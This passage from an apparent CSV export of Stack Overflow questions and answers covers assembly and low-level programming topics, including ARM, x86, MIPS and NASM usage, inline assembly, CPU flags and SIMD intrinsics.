<p>As Greg Hewgill has said, strings are passed as a pointer to the string. Therefore, the value in R0 is an address to the string. You therefore use indirect addressing to access the value like so:</p>

<pre><code>StringSearchInString( text, searchString ); // calls the ARM function...

//Going into the ARM function...

LDRB R4, [R0], #1 // Load the first value of R0 into R4 and skip 
                  // ahead one character(8 bits)
                  // Note the ""B"" in LDR. It indicates that you load ONLY 1 byte!
MOV R0, R4        // Move the value of R4 into R0. This destroys the pointer
                  // Stored in R0! Careful!
</code></pre>

<p>And success! If your string is ""hallo Alles klar"" like mine, you will have 0x68 loaded into register R0. This is the ASCII value of ""h"". From this you should be able to start working with strings.</p>
","<p>The short answer is that in C, strings are passed as a <em>pointer</em> to the character data somewhere else. For example, R0 might contain the value <code>0x01000078</code>, which would be interpreted as a pointer to the <code>""Hallo Alles klar""</code> data in memory, followed by a null character (<code>00</code> byte).. This is not unique to ARM.</p>
","3079020"
"Low level I/O access using outb and inb","11405","","<p>i'm having hard time trying to understand how interrupts work.</p>

<p>the code below initialize the Programmable Interrupt Controller</p>

<pre><code>  #define PIC0_CTRL 0x20    /* Master PIC control register address. */
  #define PIC0_DATA 0x21    /* Master PIC data register address. */

  /* Mask all interrupts*/
  outb (PIC0_DATA, 0xff);

  /* Initialize master. */
  outb (PIC0_CTRL, 0x11); /* ICW1: single mode, edge triggered, expect ICW4. */
  outb (PIC0_DATA, 0x20); /* ICW2: line IR0...7 -&gt; irq 0x20...0x27. */
  outb (PIC0_DATA, 0x04); /* ICW3: slave PIC on line IR2. */
  outb (PIC0_DATA, 0x01); /* ICW4: 8086 mode, normal EOI, non-buffered. */

  /* Unmask all interrupts. */
  outb (PIC0_DATA, 0x00);
</code></pre>

<p>can someone explain to me how it works:</p>

<p>-the role of outb (i didn't understand the linux man)</p>

<p>-the addresses and their meaning </p>

<p>another unrelated question,i read that outb and inb are for port-mapped I/O, can we use memory-mapped I/o for doing Input/output communication?</p>

<p>thanks.</p>
","<p><code>outb()</code> writes the byte specified by its second argument to the I/O port specified by its first argument. In this context, a ""port"" is a means for the CPU to communication with another chip.</p>

<p>The specific C code that you present relates to the 8259A Programmable Interrupt Controller (PIC).</p>

<p>You can read about the PIC <a href=""http://www.brokenthorn.com/Resources/OSDevPic.html"">here</a> and <a href=""http://www.acm.uiuc.edu/sigops/roll_your_own/i386/irq.html"">here</a>.</p>

<p>If that doesn't provide enough details to understand the commands and the bit masks, you could always refer to the chip's <a href=""http://www6.in.tum.de/pub/Main/TeachingWs2009Echtzeitsysteme/intel-8259.pdf"">datasheet</a>.</p>
","8960664"
"Is it possible to access 32-bit registers in C?","11368","","<p>Is it possible to access 32-bit registers in C ? If it is, how ? And if not, then is there any way to embed Assembly code in C ? I`m using the MinGW compiler, by the way.
Thanks in advance!</p>
","<p>If you want to only read the register, you can simply:</p>

<pre><code>register int ecx asm(""ecx"");
</code></pre>

<p>Obviously it's tied to instantiation.</p>

<p>Another way is using inline assembly. For example:</p>

<pre><code>asm(""movl %%ecx, %0;"" : ""=r"" (value) : );
</code></pre>

<p>This stores the <code>ecx</code> value into the variable <code>value</code>. I've already posted a similar answer <a href=""https://stackoverflow.com/questions/2582629/how-to-determine-values-saved-on-the-stack/2582902#2582902"">here</a>.</p>
","3022096"
"Segmentation Fault in Assembly Language","11354","","<p>I am learningn AT&amp;T x86 assembly language. I am trying to write an assembly program which takes an integer n, and then return the result (n/2+n/3+n/4). Here is what I have done:</p>

<pre><code>.text
.global _start
_start:
    pushl $24
    call profit
    movl %eax, %ebx
    movl $1, %eax
    int $0x80

profit:
    popl %ebx
    popl %eax
    mov $0, %esi
    movl $4, %ebp
    div %ebp
    addl %eax, %esi
    movl %ecx, %eax
    movl $3, %ebp
    div %ebp
    addl %eax, %esi
    movl %ecx, %eax
    movl $2, %ebp
    div %ebp
    addl %eax, %esi
    movl %esi, %eax
    cmpl %ecx, %esi
    jg end
    pushl %ebx
    ret

end:
    mov %ecx, %eax
    ret
</code></pre>

<p>The problem is I am getting segmentation fault. Where is the problem?</p>
","<p>I think the code fails here:</p>

<pre><code>_start:
    pushl $24
    call profit
    movl %eax, %ebx
    movl $1, %eax
    int $0x80

profit:
    popl %ebx
    popl %eax
</code></pre>

<p>So, you <code>push $24</code> (4 bytes) and then <code>call profit</code>, which pushes <code>eip</code> and jumps to <code>profit</code>. Then you pop the value of <code>eip</code> into <code>ebx</code> and the value <code>$24</code> into <code>eax</code>.</p>

<p>Then, in the end, if <code>jg end</code> branches to <code>end:</code>, then the stack won't hold a valid return address and <code>ret</code> will fail. You probably need <code>pushl %ebx</code> there too.</p>

<pre><code>    cmpl %ecx, %esi
    jg end
    pushl %ebx
    ret

end:
    mov %ecx, %eax
    ; `pushl %ebx` is needed here!
    ret
</code></pre>
","12605012"
"Assembler code in C++ code","11348","","<p>How can I put Intel asm code into my c++ application?
I'm using Dev-C++.</p>

<p>I want to do sth like that:</p>

<pre><code>int temp = 0;
int usernb = 3;

pusha
mov eax, temp
inc eax
xor usernb, usernb
mov eax, usernb
popa
</code></pre>

<p>This is only example.
How can I do sth like that?</p>

<p><strong>UPDATE:
How does it look in Visual Studio ?</strong></p>
","<blockquote>
  <p>UPDATE: How does it look in Visual Studio ?</p>
</blockquote>

<p>If you are building for 64 bit, you cannot use inline assembly in Visual Studio. If you are building for 32 bit, then you use <a href=""http://msdn.microsoft.com/en-us/library/45yd4tzz.aspx"" rel=""nofollow""><code>__asm</code></a> to do the embedding.</p>

<p>Generally, using inline ASM is a bad idea.</p>

<ol>
<li>You're probably going to produce worse ASM than a compiler.</li>
<li>Using any ASM in a method generally defeats any optimizations which try to touch that method (i.e. inlining).</li>
<li>If you need to access specific features of the processor not obvious in C++ (e.g. SIMD instructions) then you can use much more consistent with the language <em>intrinsics</em> provided by most any compiler vendor. Intrinsics give you all the speed of that ""special"" instruction but in a way which is compatible with the language semantics <em>and</em> with optimizers.</li>
</ol>
","6038449"
"How can I get an assembly language listing of my Arduino Sketches on Windows?","11331","","<p>I would like to be able to see an assembly language listing of my Arduino sketches. How can I achieve this?</p>

<p><strong>Update:</strong> I am running the Arduino Software on a Windows machine.</p>
","<p>One way to do this is to use <code>avr-objdump</code> on the <code>.elf</code> file created by the build. For example, on OS X I can do this:</p>

<pre>$ cd ~/arduino-0015/examples/Digital/Blink/applet
$ avr-objdump -d Blink.elf
</pre>

<p>(Your path on Windows may be different, obviously.) This produces a disassembly of the code, part of which will look something like this:</p>

<pre>0000013a &lt;main&gt;:
 13a:   0e 94 3e 01     call    0x27c &lt;init&gt;
 13e:   0e 94 97 00     call    0x12e &lt;setup&gt;
 142:   0e 94 80 00     call    0x100 &lt;loop&gt;
 146:   fd cf           rjmp    .-6             ; 0x142 &lt;main+0x8&gt;
</pre>
","930855"
"x86 AND instruction","11323","","<p>In x86 64-bit, I have the following instruction:</p>

<pre><code>and $0xf, %eax
</code></pre>

<p>The contents of %eax before and after remains 4. How is that possible? ANDing <code>100 &amp; 1111</code> should result in <code>1100</code> which is 12, and not 4.</p>
","<p>Since when is <code>0100 &amp; 1111 = 1100</code>?</p>

<pre><code>  0100 = 4
&amp; 1111 = 15
------
  0100 = 4
</code></pre>
","9025819"
"Pseudorandom generator in Assembly Language","11317","","<p>I need a pseudorandom number generator algorithm for a assembler program assigned in a course, and I would prefer a simple algorithm. However, I cannot use an external library. </p>

<p>What is a good, simple pseudorandom number generator algorithm for assembly?</p>
","<p>Easy one is to just choose two big relative primes a and b, then keep multiplying your random number by a and adding b. Use the modulo operator to keep the low bits as your random number and keep the full value for the next iteration.</p>

<p>This algorithm is known as the <a href=""http://en.wikipedia.org/wiki/Linear_congruential_generator"" rel=""noreferrer"">linear congruential generator</a>. </p>
","90213"
"How to convert UTF-16 to ASCII","11311","","<p>I'm writing a subroutine in MIPS assembly language to convert ASCII into UTF-16 and vice versa. However, I could not find any trick how to convert it.</p>

<p>Thanks for any ideas.</p>
","<p>Pseudocode, assuming that your bytes are octets and that no zero termination is required:</p>

<h2>Conversion from ASCII to UTF-16</h2>

<ol>
<li>Given an ASCII input string of length <em>n</em> (in bytes) stored sequentially in memory at address <em>p</em>.</li>
<li>Allocate 2 × <em>n</em> bytes of memory; let the start address of that memory be <em>q</em>.</li>
<li>While <em>n</em> is larger than zero:
<ol>
<li>Check whether the byte at <em>p</em> is a valid ASCII character. If you don't use checksumming, the most significant bit has to be zero, otherwise it has to be the correct checksum. Issue an error if the byte is not valid.</li>
<li>Zero-extend the byte at <em>p</em> to the 16-bit word at <em>q</em>. How this is done depends on the instruction set; e.g., x86 has <code>MOVZX</code>. You may also pay attention to the correct endianness.</li>
<li>Increment <em>p</em> by 1.</li>
<li>Increment <em>q</em> by 2.</li>
<li>Decrement <em>n</em> by 1.</li>
</ol></li>
</ol>

<h2>Lossless conversion from UTF-16 to ASCII</h2>

<ol>
<li>Given an UTF-16 input string of length <em>n</em> (in code units) stored sequentially in memory at address <em>p</em>.</li>
<li>Allocate <em>n</em> bytes of memory; let the start address of that memory be <em>q</em>.</li>
<li>While <em>n</em> is larger than zero:
<ol>
<li>Check whether the 16-bit word at <em>p</em> represents a valid ASCII character. The nine most significant bits have to be zero, otherwise the character is not representable in ASCII. Issue an error if the word is not valid.</li>
<li>Move the least significant byte of the 16-bit word at <em>p</em> to the byte at <em>q</em>.</li>
<li>If required, add a checksum to the byte at <em>q</em>.</li>
<li>Increment <em>p</em> by 2.</li>
<li>Increment <em>q</em> by 1.</li>
<li>Decrement <em>n</em> by 1.</li>
</ol></li>
</ol>
","5370181"
"Moving data from register into memory in NASM","11306","","<p>I'm making a program where the user enters a number, it the program prints out from zero to that number. Here is my code:</p>

<pre><code>SECTION .DATA
len  EQU 32

SECTION .bss
data resw len
other resw len 
SECTION .TEXT

GLOBAL _start
_start:

input:                  ; This section gets the integer from the user
mov eax, 3          ; }
mov ebx, 1          ; }
mov ecx, data       ; } System_read call
mov edx, len        ; }
int 80h             ; }

prelim:
mov ebp, 0

setup:                  ; This section sets up the registers ready for looping 
push ebp
pop other        ; THIS IS THE ERROR LINE!
mov esi, data 

loop:                   ; This section loops, printing out from zero to the number given
mov eax, 4
mov ebx, 1
mov ecx, other 
mov edx, len
int 80h
cmp ebp, esi
je exit
inc ebp
jmp setup
exit:                   ; Exits the program
mov eax, 1          ; }
mov ebx, 0          ; } System_exit call
int 80h             ; }
</code></pre>

<p>The problem I am having is that it gives the error <code>invalid combination of opcode and operand</code>. I have tried declaring the variable <code>other</code> a word, double word, byte, and it still says that. Why does it?</p>

<p>In essence, my question is how can I move a value in a register to a value in memory?
Such as:</p>

<pre><code>mov memorydata, eax
</code></pre>

<p>Where <code>memorydata</code> is data declared in <code>SECTION .data</code> or something of the like.</p>
","<p>First, it should be <code>pop [other]</code> and not <code>pop other</code>. In NASM, <code>other</code> is just an address, while <code>[other]</code> represents the contents/data at that address. This is how NASM is different from TASM and MASM. <code>pop other</code> is asking NASM to generate an instruction popping data from the stack into a... constant! There's no such instruction and it would not make any sense to make one like that. You want to pop stuff into a register or memory.</p>

<p>Second, unlike TASM and MASM (again), NASM does not assign to label names any kind of type or size. Labels are just that, named locations (addresses) in code or data.</p>

<p>For that reason <code>pop [other]</code> is ambiguous to NASM because <code>pop</code> can pop a word or a double word and you don't specify which one you want and there's no way for NASM to guess the right size for you.</p>

<p>What you should write instead is either</p>

<pre><code>pop word [other]
</code></pre>

<p>or</p>

<pre><code>pop some_32_bit_register ; e.g. pop eax
mov [other], that_same_32_bit_register_s_lower_half ; e.g. mov [other], ax
</code></pre>

<p>I strongly suggest not to push or pop 16-bit registers or variables or constants. They misalign the stack, which can lead to reduced performance and silly bugs due to attention loss (e.g. you push a 32-bit value and then mistakenly pop it as 16-bit or the other way around).</p>
","12854316"
"Assembly Code File Extension","11272","","<p>I'm just beginning to learn assembly code, and am still unsure about something; what file extension would assembly code source use?</p>
","<p>You can (probably) use whatever you want.  Some common ones are <code>.s</code>, <code>.S</code>, and <code>.asm</code>.  Check your compiler/assembler documentation to find out if one is preferred for your system/toolchain.  GCC and Clang, for example, will assume a file contains assembly code if you use a <code>.s</code> extension.  If you use something else, you need to pass an appropriate <code>-x</code> flag to have the front-end do the right thing.</p>
","19148476"
"Fast ARM NEON memcpy","11256","","<p>I want to copy an image on an ARMv7 core. The naive implementation is to call memcpy per line.</p>

<pre><code>for(i = 0; i &lt; h; i++) {
  memcpy(d, s, w);
  s += sp;
  d += dp;
}
</code></pre>

<p>I know that the following</p>

<pre><code>d, dp, s, sp, w
</code></pre>

<p>are all 32-byte aligned, so my next (still quite naive) implementation was along the lines of</p>

<pre><code>for (int i = 0; i &lt; h; i++) {
  uint8_t* dst = d;
  const uint8_t* src = s;
  int remaining = w;
  asm volatile (
    ""1:                                               \n""
    ""subs     %[rem], %[rem], #32                     \n""
    ""vld1.u8  {d0, d1, d2, d3}, [%[src],:256]!        \n""
    ""vst1.u8  {d0, d1, d2, d3}, [%[dst],:256]!        \n""
    ""bgt      1b                                      \n""
    : [dst]""+r""(dst), [src]""+r""(src), [rem]""+r""(remaining)
    :
    : ""d0"", ""d1"", ""d2"", ""d3"", ""cc"", ""memory""
  );
  d += dp;
  s += sp;
}
</code></pre>

<p>Which was ~150% faster than memcpy over a large number of iterations (on different images, so not taking advantage of caching). I feel like this should be nowhere near the optimum because I am yet to use preloading, but when I do I only seem to be able to make performance substantially worse. Does anyone have any insight here?</p>
","<p>ARM has a great tech note on this.</p>

<p><a href=""http://infocenter.arm.com/help/index.jsp?topic=/com.arm.doc.faqs/ka13544.html"" rel=""nofollow"">http://infocenter.arm.com/help/index.jsp?topic=/com.arm.doc.faqs/ka13544.html</a></p>

<p>Your performance will definitely vary depending on the micro-architecture, ARM's note is on the A8 but I think it will give you a decent idea, and the summary at the bottom is a great discussion of the various pros and cons that go beyond just the regular numbers, such as which methods result in the least amount of register usage, etc.</p>

<p>And yes, as another commenter mentions, pre-fetching is very difficult to get right, and will work differently with different micro-architectures, depending on how big the caches are and how big each line is and a bunch of other details about the cache design. You can end up thrashing lines you need if you aren't careful. I would recommend avoiding it for portable code. </p>
","14837504"
"What do I need for development for an ARM processor?","11241","","<p>I'm familiar with X86[-64] architecture &amp; assembly. I want to start develop for an ARM processor. But unlike desktop processors, I don't have an actual ARM processor. I think I need an ARM simulator.</p>

<p><a href=""http://www.armtutorial.com/"" rel=""nofollow noreferrer"">http://www.armtutorial.com/</a> say</p>

<blockquote>
  <p>An ARM assembly compiler will be required, the most accessible is the ARMulator.</p>
</blockquote>

<p>I thought of downloading Armulator but found from <a href=""http://forums.arm.com/index.php?showtopic=13744"" rel=""nofollow noreferrer"">http://forums.arm.com/index.php?showtopic=13744</a> that</p>

<blockquote>
  <p>Its not sold seperately. But you can download an eval of RVDS - which includes RVISS/ARMulator</p>
</blockquote>

<p>I've downloaded &amp; installed RVDS but It looks very complex. I'm unable to figure out what do I need to do <strong>to write ARM assembly &amp; run it</strong>.</p>

<ul>
<li>I want to write in assembly not in C/C++. I don't have an ARM processor. What is a good simulator?</li>
<li>Can any one please mention in short. How to write assembly &amp; assemble &amp; simulate using RVDS. Please be clear?</li>
<li>Are there any other alternative ways. I can't afford buying any kind of boards.</li>
<li><p>I always learn from books rather than tutorials. I'm following these two books:</p>

<ol>
<li><a href=""http://rads.stackoverflow.com/amzn/click/1558608745"" rel=""nofollow noreferrer"">ARM System Developer's Guide: Designing and Optimizing System Software (The Morgan Kaufmann Series in Computer Architecture and Design)</a> </li>
<li><a href=""http://rads.stackoverflow.com/amzn/click/0201675196"" rel=""nofollow noreferrer"">ARM System-on-Chip Architecture (2nd Edition)</a> </li>
</ol></li>
</ul>

<p>Do you have any better suggestions?</p>
","<h2>Options for environments</h2>

<ul>
<li>Install Linux in the <a href=""http://www.qemu.org"" rel=""noreferrer"">QEMU</a> system emulator. It can emulate a variety of ARM-based chipsets.</li>
<li>Get an emulator for a specific ARM-chipset like a game handheld. Gameboy Advance is fun to play with. <a href=""http://nocash.emubase.de/gba.htm"" rel=""noreferrer"">NoCash GBA</a> and <a href=""http://vba.ngemu.com/"" rel=""noreferrer"">VisualBoy Advance</a> are two great GBA emulators.</li>
</ul>

<h2>Toolchains</h2>

<p>You will need a toolchain. A toolchain is a collection of low-level tools like an assembler, a linker, a compiler, an archiver and a bunch of other usefull stuff. Even more, you want a cross-toolchain, which means that the toolchain runs on one system, but builds executables for another architecture. This way you can build applications that run on ARM-devices, but on your x86-based PC. It's faster and more convenient.</p>

<p>If you run Windows, <a href=""http://www.devkitpro.org/"" rel=""noreferrer"">DevkitPro</a> is a fairly good choice. For Unix/Linux/BSD variants, you have <a href=""http://www.codesourcery.com/"" rel=""noreferrer"">CodeSourcery's free toolchains</a>, and the GCC toolchain from <a href=""http://www.gnuarm.com/"" rel=""noreferrer"">gnuarm.com</a>. There are several others, but you don't need more options.</p>

<h2>Documentation</h2>

<p>Get the specification for your ARM CPU of choice at <a href=""http://infocenter.arm.com/"" rel=""noreferrer"">infocenter.arm.com</a>. One reference you need no matter the CPU is the ARM Architecture Reference Manual (Often abbreviated ARMARM). I'm hosting an older version, which covers the ARM architecture and instruction set version up to ARMv4T,  <a href=""http://www.mechcore.net/files/docs/ddi0100e_arm_arm.pdf"" rel=""noreferrer"">here</a>, but you will find the current and later versions on <a href=""http://infocenter.arm.com/"" rel=""noreferrer"">infocenter.arm.com</a> as well. If you go for GBA, notice that the CPU is an ARM7TDMI, with the instruction set version ARMv4T.</p>

<p>The ARMARM contains tips and examples for usual nitty-gritty system coding, tips on how to proceed on certain design issues, as well as a reference of both the ARM instruction set, Thumb instruction set and co-processors like MMUs, MPUs, DSPs and FPUs.</p>

<p>If you stick with QEMU, that's pretty much all you need, since the Linux kernel handles everything. QEMU also has user-mode emulation (with a C-library stub). If you go for one of the GBA emulators, here's a nice reference over the GBA hardware and hardware registers: <a href=""http://www.cs.rit.edu/~tjh8300/CowBite/CowBiteSpec.htm"" rel=""noreferrer"">CowBiteSpec</a>. Also make sure to check out <a href=""http://www.gbadev.org/"" rel=""noreferrer"">http://www.gbadev.org/</a>.</p>

<p>Nintendo DS is probably an option as well, but I don't know of any decent emulators for that handheld yet. Good luck to you :-)</p>

<p>EDIT: Here's a trivial example of some GBA code I wrote years ago: <a href=""http://www.mechcore.net/files/code/gba.s.txt"" rel=""noreferrer"">GBA Color fill 240x160 16-bit example</a></p>
","2652056"
"what is the syntax to define a string constant in assembly?","11159","","<p>I am learning assembly I see two examples of defining a string:</p>

<p>msg  db  'Hello, world!',0xa </p>

<ul>
<li>what does the 0xa mean here?</li>
</ul>

<p>message DB 'I am loving it!', 0</p>

<ul>
<li>why we have a 0 here?</li>
<li>is it a trailing null character?</li>
<li>why we have 0xa the above example but 0 here? (doesn't seem they are relating to string length)</li>
</ul>

<p>If the above examples are two ways of defining an assembly string, how could the program differentiate them?</p>

<p>Thanks ahead for any help :)</p>
","<p>The different assemblers have different syntax, but in the case of <code>db</code> directive they are pretty consistent.</p>

<p><code>db</code> is an assembly directive, that defines bytes with the given value in the place where the directive is located in the source. Optionally, some label can be assigned to the directive. </p>

<p>The common syntax is:</p>

<pre><code>[label]  db  n1, n2, n3, ..., nk
</code></pre>

<p>where n1..nk are some byte sized numbers (from 0..0xff) <strong>or</strong> some string constant. </p>

<p>As long as the ASCII string consists of bytes, the directive simply places these bytes in the memory, exactly as the other numbers in the directive.</p>

<p>Example:</p>

<pre><code>db 1, 2, 3, 4
</code></pre>

<p>will allocate 4 bytes and will fill them with the numbers 1, 2, 3 and 4</p>

<pre><code>string  db 'Assembly', 0, 1, 2, 3
</code></pre>

<p>will be compiled to:</p>

<pre><code>string:  41h, 73h, 73h, 65h, 6Dh, 62h, 6Ch, 79h, 00h, 01h, 02h, 03h
</code></pre>

<p>The character with ASCII code 0Ah (0xa) is the character LF (line feed) that is used in Linux as a new line command for the console.</p>

<p>The character with ASCII code 00h (0) is the NULL character that is used as a end-of-string mark in the C-like languages. (and probably in the OS API calls, because most OSes are written in C)</p>

<p>Appendix 1: There are several other assembly directives similar to DB in that they define some data in the memory, but with other size. Most common are DW (define word), DD (define double word) and DQ (define quadruple word) for 16, 32 and 64 bit data. However, their syntax accepts only numbers, not strings.</p>
","19527090"
"How to call C functions from ARM Assembly?","11149","","<p>I'm writing code targeting ARM Cortex-A on Android devices (using GNU assembler and compiler), and I'm trying to interface between Assembly and C. In particular, I'm interested in calling functions written in C from Assembly. I tried many things, including the <code>.extern</code> directive, declaring C functions with <code>asm</code> and <code>__asm__</code> and so on, but none of them worked, so I'm looking for a minimal example of doing so. A reference to such example would be just as welcome.</p>
","<p>You need to read the ARM ARM and/or know the instruction set is all, normally you would want to do something like this</p>

<pre><code>asm:

bl cfun

c:
void cfun ( void )
{

}
</code></pre>

<p>You can try this yourself. for gnu as and gcc this works just fine it should also work just fine if you use clang to get the c code to an object and gnu as for assembler.  Not sure what you are using.</p>

<p>The problem with the above is bl has a limited reach,</p>

<pre><code>if ConditionPassed(cond) then
  if L == 1 then
    LR = address of the instruction after the branch instruction
    PC = PC + (SignExtend_30(signed_immed_24) &lt;&lt; 2)
</code></pre>

<p>knowing that the bl instruction sets the link register to the instruction after the bl instruction, then if you read about the program counter register:</p>

<pre><code>For an ARM instruction, the value read is the address of the instruction
plus 8 bytes. Bits [1:0] of this
value are always zero, because ARM instructions are always word-aligned.
</code></pre>

<p>so if you make your asm look like this:</p>

<pre><code>mov lr,pc
ldr pc,=cfun
</code></pre>

<p>you get</p>

<pre><code>d6008034:   e1a0e00f    mov lr, pc
d6008038:   e51ff000    ldr pc, [pc, #-0]   ; d6008040 
...
d6008040:   d60084c4    strle   r8, [r0], -r4, asr #9
</code></pre>

<p>The assembler will reserve a memory location, within reach of the ldr pc, instruction (if possible, otherwise generate an error) where it will place the full 32 bit address for the instruction.  the linker will later fill in this address with the external address.  that way you can reach any address in the address space.</p>

<p>if you dont want to play assembler games like that and want to be in control then you create the location to keep the address of the function and load it into the pc yourself:</p>

<pre><code>    mov lr,pc
    ldr pc,cfun_addr

...

cfun_addr:
    .word cfun
</code></pre>

<p>compiled:</p>

<pre><code>d6008034:   e1a0e00f    mov lr, pc
d6008038:   e51ff000    ldr pc, [pc, #-0]   ; d6008040 &lt;cfun_addr&gt;
...

d6008040 &lt;cfun_addr&gt;:
d6008040:   d60084c4    strle   r8, [r0], -r4, asr #9
</code></pre>

<p>Lastly if you want to move into the modern ARM world where ARM and thumb is mixed or can be (for example use bx lr instead of mov pc,lr) then you will want to use bx</p>

<pre><code>    add lr,pc,#4
    ldr r1,cfun_addr
    bx r1
...

cfun_addr:
    .word cfun
</code></pre>

<p>of course you need another register to do that and remember to push and pop your link register and the other register before and after your call to C if you want to preserve them.</p>
","8423699"
"What is the difference between RCR and ROR?","11129","","<p>I understand the from the terms that <code>RCR</code> would rotate the bit from the right to left, taking the <strong>bit from the carry</strong> while <code>ROR</code> will rotate the bit from right to left, taking the <strong>bit from the right</strong> but is that the only difference between them? If this is so, both of the instructions seem to do the same work. Please help out. Thanks </p>
","<p>RCR includes the carry flag in the rotation, so it's effectively an N+1 bit rotate, whereas ROR does not include the carry flag, so it's just an N bit rotate.</p>

<p>Some nice diagrams from <a href=""http://www.c-jump.com"" rel=""noreferrer"">www.c-jump.com</a>:</p>

<p><img src=""https://i.stack.imgur.com/pFTAH.png"" alt=""enter image description here""></p>

<p><img src=""https://i.stack.imgur.com/A4NyR.png"" alt=""enter image description here""></p>
","10395112"
"check if a register value is even/odd in MIPS","11086","","<p>I tried to do the following:</p>

<pre><code>andi $s7, $s6, 0x1      # (i + j) &amp; 1 (to check if it's even)
</code></pre>

<p>however it generates an error... am I doing something wrong?</p>
","<p>Try</p>

<pre><code>andi $s7, $s6, 1
</code></pre>

<p>Or</p>

<pre><code>andi $23, $22, 1      # $22=$s6  and   $23=$s7
</code></pre>

<p>If you use SPIM Simulator, first code should work.<br><br>
Note that the comment of the code you show, does not describe the code line.</p>

<blockquote>
  <p><strong>andi Rdest, Rsrc1, Imm</strong><br> Put the logical
  AND of the integers from register
  Rsrc1 And Imm into register Rdest.</p>
</blockquote>
","2300205"
"Linux Assembly - Could not read symbols: File in wrong format","11075","","<p>I am trying to compile an asm program on a linux server. I am new to writing asm programs, but I follow my school's tutorial and do everything they say but it has no success.</p>

<p>Here is my hello.asm file.</p>

<pre><code>    SECTION .data
msg:    db ""Hello World"",10
len:    equ $-msg
    SECTION .text
        global main
main:
    mov edx,len
    mov ecx,msg
    mov ebx,1
    mov eax,4
    int 0x80
    mov ebx,0
    mov eax,1
    int 0x80
</code></pre>

<p>I compile this file using the command line <code>nasm -f elf hello.asm</code> which works completely fine and generates an object file. The problem is, when I try <code>ld hello.o</code>, it says that it cannot read symbols in the file and the file is in the wrong format.</p>

<p>Can anyone help me and tell me how I can compile a .asm file so it can run?</p>
","<p>I've had a similar problem today, as a result of mixed 32-bit and 64-bit libraries (which is why I happen to have come upon your question). <code>ld</code> will complain if you try to link libraries of different types.</p>

<p>To specify the type you should be able to specify <code>-m32</code> for 32-bit.</p>

<p><em>as an alternative</em>, I also suspect that your <code>hello.o</code> could be generated as 64-bit by using <code>-f elf64</code> on <code>nasm</code>.</p>
","26659177"
"Developing Android apps using assembly language","11063","","<p>How do I develop Android apps using assembly language, either in Windows or Linux?</p>
","<p>Try this: <a href=""http://peterdn.com/post/e28098Hello-World!e28099-in-ARM-assembly.aspx"" rel=""nofollow"">http://peterdn.com/post/e28098Hello-World!e28099-in-ARM-assembly.aspx</a></p>

<p>Generally, all you need is a cross compiler for android linux.</p>
","21954426"
"what is the diffrence between zero flag and carry flag ?","11040","","<p>What is the difference between the zero flag and carry flag? </p>

<p>For zero flag it said</p>

<pre><code>mov ax , 0FFFF ; 
inc ax ; AX= 0 , ZF=1
</code></pre>

<hr>

<p>For carry flag it said</p>

<pre><code>mov al , 0FFh
add al , 1  ; CF=1,AL=00
</code></pre>

<p>The value of <code>AL</code> is equal to zero so why is the zero flag not set to 1? </p>
","<p>It sounds like you understand what the flags mean/do, just in case:</p>

<p>the zero flag is quite simple if the result of the operation is a zero the zero flag will be set otherwise it will be clear</p>

<p>The carry flag is used a number of ways but in this case with an add operation, it is the carry out bit, an unsigned overflow.</p>

<p>Say you were adding the two decimal numbers 92 and 5 you get 97, no problem, if you add 92 and 12, you get 104, but what if you had a decimal computer or had a small scrap of paper and you could only hold two digits as a result then the answer is 04 not 104, the answer may be considered wrong depending on what you were wanting to do.  As you were doing that math you were saying to yourself 2+2 = 4, then 9 + 1 = 0 carry the 1.  that is where carry comes from you carry that one to the next column but the processor has a limited number of columns.</p>

<p>The add logic (sub uses an add) does not know or care about signed (twos complement) vs unsigned numbers (that is the beauty of twos complement), you feed the operands to the same logic you get the same answer.   Where it will differ is in the overflow, unsigned overflow is the carry out bit.  Signed overflow if the processor has it (I am speaking generally not specific to one processor) detects if the result does not contain enough information to store the answer.  0x80 + 0x80 = 0x00 for example.  unsigned that is 128 + 128 and you get a signed overflow, unsigned it is -128 + -128 the result is -256.  You have added two negative numbers, minus plus a minus equals a minus but you ended up with 0x00 which is a positive number, overflow.  so 0x80 + 0x80 for 8 bit systems that support both overflows will give both overflows (plus the zero flag as an added bonus).</p>

<p>No matter what the instruction set if you are using the flags you need to look up and or memorize the flags affected by each instruction (you are using to set flags).  Each instruction set has different flag rules, not every alu instruction affects all the flags, etc.  Cases where you have an inc instruction separate from an add with (small) immediate instruction which could be used to perform an inc it is within reason that the designers would have one affect flags and the other not.  For a case like this one in particular where you have these split definitions of the same register, EAX, AX, AH, AL, where you can do operations on fractions of the register do you declare an AH operation to be zero even if the rest of the register is not zero?  Is it a definition based on the operation size or the whole register outside the portion you operated on?  Everyone here may know the answer, but as soon as you saw register definitions when first starting to learn this processor that should have been a first thought.  And until you look up the answer and memorize it you should look it up each time you want to get flags out of an instruction.  Designers will intentionally put operations in that dont mess with flags to save on instructions needed to perform an operation.  Some may not some force the flags to always be the instruction before the branch on decision, some (mips) the branch itself is the alu operation and decision (no flags).  </p>

<p>The answer to your question is look it up in the documentation, make a habit of looking it up.  Dont assume that all alu operations affect all flags, look it up for the instruction and registers in question.  The answer to ""why"" is because that is what they felt like doing, it is what it is, unless you are on a team designing a new processor, as a programmer you get what you get, work with it...Your question itself leads to expectations of different answers, you switch from 16 bit to 8 bit operations and you switch from an add to inc, either one or both is perfectly valid for the designers to change the definitions for, expect them to.</p>
","10949196"
"print a __m128i variable","11022","","<p>I'm trying to learn to code using intrinsics and below is a code which does addition</p>

<p><code>compiler used: icc</code></p>

<pre><code>#include&lt;stdio.h&gt;
#include&lt;emmintrin.h&gt;
int main()
{
        __m128i a = _mm_set_epi32(1,2,3,4);
        __m128i b = _mm_set_epi32(1,2,3,4);
        __m128i c;
        c = _mm_add_epi32(a,b);
        printf(""%d\n"",c[2]);
        return 0;
}
</code></pre>

<p>I get the below error:</p>

<pre><code>test.c(9): error: expression must have pointer-to-object type
        printf(""%d\n"",c[2]);
</code></pre>

<p>How do I print the values in the variable <code>c</code> which is of type <code>__m128i</code></p>
","<p>Use this function to print them:</p>

<pre><code>void print128_num(__m128i var)
{
    uint16_t *val = (uint16_t*) &amp;var;
    printf(""Numerical: %i %i %i %i %i %i %i %i \n"", 
           val[0], val[1], val[2], val[3], val[4], val[5], 
           val[6], val[7]);
}
</code></pre>

<p>You split 128bits into 16-bits(or 32-bits) before printing them.</p>

<p>This is a way of 64-bit splitting and printing if you have 64-bit support available:</p>

<pre><code>void print128_num(__m128i var) 
{
    int64_t *v64val = (int64_t*) &amp;var;
    printf(""%.16llx %.16llx\n"", v64val[1], v64val[0]);
}
</code></pre>
","13257283"
